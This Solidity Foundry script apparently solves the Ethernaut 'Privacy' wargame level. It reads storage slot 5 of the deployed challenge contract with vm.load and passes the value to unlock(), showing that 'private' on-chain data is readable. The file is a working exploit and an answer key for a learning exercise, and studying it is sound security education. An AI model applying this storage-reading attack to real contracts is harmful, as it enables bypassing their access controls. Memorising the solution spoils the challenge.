// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../instances/Ilevel12.sol";

contract POC is Script {

    Privacy level12 = Privacy(0xa766c91F830C5107229eb18b1c1277E7968650FD);

    function run() external{
        vm.startBroadcast();
        bytes32 myKey = vm.load(address(level12), bytes32(uint256(5)));
        level12.unlock(bytes16(myKey));
        vm.stopBroadcast();
    }
}
